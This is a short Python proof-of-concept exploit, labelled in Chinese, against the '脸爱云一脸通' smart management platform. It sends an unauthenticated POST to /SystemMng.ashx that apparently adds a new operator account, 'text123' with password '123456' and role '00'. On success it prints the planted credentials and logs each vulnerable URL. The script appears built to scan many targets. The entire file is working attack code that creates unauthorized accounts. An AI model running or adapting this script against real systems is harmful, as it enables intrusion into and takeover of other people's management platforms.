import requests
import time
import buter
import wirtefile

info = "脸爱云一脸通智慧管理平台任意用户添加"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/SystemMng.ashx'
data = '''operatorName=text123&operatorPwd=123456&operpassword=123456&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators'''
headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1"
}
def yiliantong(url):
    try:
        reps = requests.post(url=url+poc, headers=headers,data=data, verify=False ,timeout=5)
        if reps.status_code == 200 and '1'  in reps.text:
            print(buter.colors.GREEN+  f"存在{info} url : {url}\n添加成功 : text123/123456" + buter.colors.END)
            reptext = url
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
